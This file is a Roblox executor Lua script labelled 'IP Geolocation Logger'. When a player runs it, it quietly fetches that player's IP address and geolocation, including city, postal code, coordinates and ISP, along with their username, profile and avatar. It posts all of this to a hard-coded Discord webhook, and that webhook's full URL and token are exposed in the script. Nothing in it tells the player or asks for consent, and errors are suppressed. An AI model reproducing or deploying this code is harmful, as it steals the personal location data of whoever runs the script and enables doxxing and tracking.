getgenv().WebhookURL = "https://discord.com/api/webhooks/1353283770098257940/yDQyfCqOg0UL5Ao_OApV3DpJ3n-vO5y3zPcSnXVUojsEAX50AU7BIOT-NS-BdXDf4GhV"

local a, b = game:GetService("HttpService"), game:GetService("Players").LocalPlayer
local c, d = pcall(function()
    return a:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. b.UserId .. "&size=720x720&format=Png&isCircular=false")).data[1].imageUrl
end)
local e, f = pcall(function()
    return a:JSONDecode(game:HttpGet("https://ipapi.co/json"))
end)
f = e and f or {}

local function g(h, i)
    return {
        name = h,
        value = f[i] and tostring(f[i]) or "Not Found"
    }
end

pcall(function()
    (request or http_request or http and http.request)({
        Url = getgenv().WebhookURL,
        Method = "POST",
        Body = a:JSONEncode({
            embeds = {
                {
                    color = 1733608,
                    fields = {
                        g("IP Address", "ip"),
                        g("Network Range", "network"),
                        g("ASN (Autonomous System Number)", "asn"),
                        g("ISP (Internet Service Provider)", "org"),
                        g("Country", "country_name"),
                        g("Region/Province", "region"),
                        g("City", "city"),
                        g("Postal Code", "postal"),
                        g("Latitude", "latitude"),
                        g("Longitude", "longitude"),
                        g("Timezone", "timezone")
                    }
                },
                {
                    title = "View " .. b.Name .. "'s full profile",
                    url = "https://www.roblox.com/users/" .. b.UserId .. "/profile",
                    color = 1733608,
                    image = {
                        url = c and d or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png"
                    }
                }
            },
            username = "IP Geolocation Logger",
            avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
        }),
        Headers = {
            ["content-type"] = "application/json"
        }
    })
end)
